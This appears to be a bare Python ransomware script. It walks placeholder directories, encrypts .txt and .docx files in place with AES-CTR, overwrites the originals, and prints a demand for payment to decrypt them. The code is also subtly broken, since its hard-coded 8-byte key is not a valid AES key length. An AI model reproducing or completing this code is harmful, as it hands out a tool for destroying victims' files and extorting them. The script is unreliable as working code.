import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

encryption_key = b'12345678'

target_directories = ['/path/to/directory1', '/path/to/directory2']
target_extensions = ['.txt', '.docx']

def encrypt_file(file_path):
    # Read the file
    with open(file_path, 'rb') as file:
        file_data = file.read()

    iv = os.urandom(16)

    cipher = Cipher(algorithms.AES(encryption_key), modes.CTR(iv), backend=default_backend())

    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(file_data) + encryptor.finalize()

    encrypted_data_with_iv = iv + encrypted_data

    with open(file_path, 'wb') as file:
        file.write(encrypted_data_with_iv)

def encrypt_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if os.path.splitext(file_path)[1] in target_extensions:
                encrypt_file(file_path)

for directory in target_directories:
    encrypt_files_in_directory(directory)

print('Your files have been encrypted. To decrypt them, send a payment to the following address...')
